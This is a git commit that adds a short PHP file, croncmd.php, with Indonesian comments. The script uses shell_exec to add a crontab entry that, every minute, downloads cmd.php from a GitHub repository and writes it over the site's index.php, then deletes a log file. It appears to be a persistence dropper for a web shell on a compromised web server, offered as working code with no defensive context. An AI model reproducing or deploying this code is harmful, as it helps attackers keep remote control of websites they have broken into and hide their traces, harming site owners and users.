febcab0f027c50ff1585bec84edd37f05de5e24b
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-11-06 09:08:39 -1100

    Create croncmd.php

---
+++ croncmd.php
@@ -0,0 +1,22 @@
+<?php
+// URL yang ingin Anda unduh
+$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/cmd.php';
+
+// Direktori tempat skrip PHP ini diakses
+$currentDirectory = dirname(__FILE__);
+
+// Buat perintah wget
+$downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/index.php');
+
+// Tugas Cron untuk mengunduh file setiap 30 detik dan kemudian menghapus log
+$downloadCronCommand = '* * * * * ' . $downloadCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');
+
+// Tambahkan tugas Cron yang baru
+$result = shell_exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -');
+
+if ($result === false) {
+    echo 'Gagal menambahkan tugas Cron untuk mengunduh file.';
+} else {
+    echo 'Tugas Cron untuk mengunduh file berhasil ditambahkan.';
+}
+?>
